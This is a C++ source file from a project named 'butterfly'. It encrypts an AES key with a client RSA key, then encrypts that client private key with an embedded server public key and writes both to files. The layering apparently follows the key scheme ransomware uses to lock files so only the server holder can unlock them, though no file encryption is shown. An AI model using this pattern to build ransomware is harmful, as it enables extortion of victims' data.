
#include "crypto/encryptor.h"

namespace butterfly {

Encryptor::Encryptor(int keySize) :_keySize(keySize),  _rsaEncryptorAESKey(new RSAEncryptor(_keySize)),
                                                       _rsaEncryptorCPrivateRSA(new RSAEncryptor(SPUBLIC_PEM)) {

}

Encryptor::~Encryptor() {

}

void Encryptor::encryptCPrivateRSA() {

    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();

    if (_rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr.substr(0, cPrivateRSAStr.size()-1)) ) {
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedKey();
        _rsaEncryptorCPrivateRSA->saveEncryptedKeyFile(CPRIVATERSA_FILENAME, cPrivateRSAEnc, _rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));
    } else {
        LOG_ERROR("Could not encrypt the " << CPRIVATERSA_FILENAME);
    }
}

void Encryptor::encryptAESKey() {

    if ( _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), _aesKey) ) {
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
        _rsaEncryptorAESKey->saveEncryptedKeyFile(AES_KEY_ENC_FILENAME, aesKeyEnc, _rsaEncryptorAESKey->getRSAKeySize());
    } else {
        LOG_ERROR("Could not encrypt the " << AES_KEY_ENC_FILENAME);
    }
}

} // namespace butterfly
